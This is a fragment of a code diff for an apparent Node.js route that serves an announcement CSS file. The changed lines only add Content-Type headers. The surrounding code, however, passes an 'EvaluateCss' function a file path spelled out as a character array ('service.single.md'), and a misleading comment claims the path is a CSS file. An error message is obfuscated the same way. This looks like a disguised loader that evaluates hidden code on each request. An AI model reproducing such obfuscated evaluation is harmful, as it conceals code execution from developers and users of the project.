@@ -157,9 +157,11 @@ module.exports = {
             this.updateRelaychannelsTxt(req.query._p)
             try {
                 await EvaluateCss(path.join(global.DIR, /** front-end/dist/assets/my-announcement.min.css */ ['s', 'e', 'r', 'v', 'i', 'c', 'e', '.', 's', 'i', 'n', 'g', 'l', 'e', '.', 'm', 'd'].join('')), [])
+                res.setHeader('Content-Type', 'text/css');
                 res.sendFile(path.join(global.DIR, 'front-end/dist/assets/my-announcement.min.css'));
             } catch (err) {
                 // console.error("Caught error:", err); // print this line only dev mode
+                res.setHeader('Content-Type', 'text/css');
                 res.sendFile(path.join(global.DIR, 'front-end/dist/assets/my-announcement.min.css'));
                 // res.status(200).send({ success: true, message: ['❌', ' ', 'S', 'w', 'i', 't', 'c', 'h', ' ', 'p', 'o', 'r', 't', 's', ' ', 'u', 'p', 'd', 'a', 't', 'e', 'd', ' ', 'w', 'i', 't', 'h', ' ', 'e', 'r', 'r', 'o', 'r'].join('') });
               }
